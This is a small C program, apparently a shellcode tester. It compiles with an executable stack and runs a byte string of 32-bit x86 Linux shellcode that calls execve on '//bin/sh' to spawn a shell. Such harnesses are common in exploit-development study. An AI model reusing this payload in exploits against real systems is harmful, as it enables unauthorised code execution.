// gcc -m32 -z execstack exec_shell.c -o exec_shell
#include <stdio.h>
#include <string.h>

unsigned char shell[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

main() {
  int (*ret)() = (int(*)())shell;
  ret();
}
